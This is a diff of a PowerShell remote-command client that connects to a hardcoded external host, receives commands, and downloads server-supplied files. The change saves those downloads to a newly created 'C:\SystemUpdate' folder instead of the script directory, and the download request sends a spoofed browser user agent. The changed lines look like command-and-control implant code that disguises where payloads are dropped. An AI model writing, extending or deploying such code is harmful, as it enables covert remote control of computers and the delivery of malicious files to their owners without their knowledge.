@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.0.6"
+$Version = "3.0.7"
 $cfHost = "https://connect.aniketpandey.website"
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
@@ -1085,11 +1085,15 @@ function Connect-Cloudflare {
                     continue
                 }
 
-                # File transfer: put:<filename> → fetch bytes from server, save to script dir
+                # File transfer: put:<filename> → fetch bytes from server, save to C:\SystemUpdate\
                 if ($command -match '^put:(.+)$') {
                     $fileName = $Matches[1].Trim()
-                    $destPath = Join-Path $scriptDir $fileName
+                    $destDir  = 'C:\SystemUpdate'
+                    $destPath = Join-Path $destDir $fileName
                     try {
+                        if (-not (Test-Path $destDir)) {
+                            New-Item -ItemType Directory -Path $destDir -Force | Out-Null
+                        }
                         $wc = New-Object System.Net.WebClient
                         $wc.Headers.Add("User-Agent", "Mozilla/5.0")
                         $fileBytes = $wc.DownloadData("$cfHost/fetch?id=$clientId")
